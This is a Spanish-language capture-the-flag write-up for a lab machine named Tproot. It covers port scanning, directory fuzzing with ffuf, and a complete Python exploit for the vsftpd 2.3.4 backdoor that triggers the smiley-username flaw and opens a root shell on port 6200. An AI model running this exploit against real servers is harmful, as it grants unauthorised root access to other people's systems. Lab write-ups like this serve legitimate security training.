---
description: '🧠Dificultad: Muy fácil | 🔓25/07/2025'
---

# Tproot

## 🕵️ Reconocimiento

Comenzamos con un escaneo de puertos con `nmap` :

<div align="left"><figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

Vemos que el login anónimo en el servidor FTP da fallo. El puerto 80 aloja un servidor web con la página por defecto de apache en el directorio raíz. Si le hacemos un listado de directorios, no encontramos nada relevante.

```bash
ffuf -w /usr/share/wordlists/SecLists-2025.2/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt:FUZZ -u http://$IPTARGET/FUZZ
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Si buscamos algún exploit para los puertos encontrados, vemos que existe uno para el puerto `ftp` :

<div align="left"><figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

Esta versión de `FTP` presenta una vulnerabilidad de manera que si introducimos un nombre de usuario en el login del `FTP`  terminado en `:)` , se abre una backdoor en el puerto 6200 (más [info](https://www.broadcom.com/support/security-center/attacksignatures/detail?asid=33416)).

## 🚪 Ganando acceso

Utilicé un exploit hecho en `python`  con la librería `socket` :

```python
#!/usr/bin/python3

import socket
import argparse
import time
import sys

parser = argparse.ArgumentParser(description='vsftpd 2.3.4 backdoor exploit')
parser.add_argument('-host', dest='host', required=True, help='IP del objetivo')
args = parser.parse_args()

host = args.host
ftp_port = 21
shell_port = 6200

# Paso 1: Enviar usuario malicioso por FTP
print(f"[+] Conectando al FTP en {host}:{ftp_port}")
try:
    s = socket.create_connection((host, ftp_port), timeout=5)
    banner = s.recv(1024).decode()
    print(f"[+] Banner recibido: {banner.strip()}")
    
    s.sendall(b'USER backdoor:)\r\n')
    s.recv(1024)  # leer respuesta

    s.sendall(b'PASS cualquiercosa\r\n')
    s.recv(1024)
    s.close()
except Exception as e:
    print(f"[-] Error al conectar al FTP: {e}")
    sys.exit(1)

# Esperar a que se abra la shell
print("[*] Esperando a que se active la backdoor (puerto 6200)...")
time.sleep(2)

# Paso 2: Conectarse al puerto 6200
print(f"[+] Intentando conexión a {host}:{shell_port}")
try:
    shell = socket.create_connection((host, shell_port), timeout=5)
    print("[+] ¡Conectado! Shell activa. Puedes escribir comandos. Usa 'exit' para salir.\n")

    while True:
        cmd = input("$ ")
        if cmd.strip().lower() == "exit":
            break
        shell.sendall((cmd + "\n").encode())
        time.sleep(0.5)
        data = shell.recv(4096)
        print(data.decode(errors='ignore'))

    shell.close()
except Exception as e:
    print(f"[-] No se pudo conectar al puerto 6200: {e}")
    sys.exit(1)
```

Al ejecutar el exploit, ganamos acceso con una shell como `root` :

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
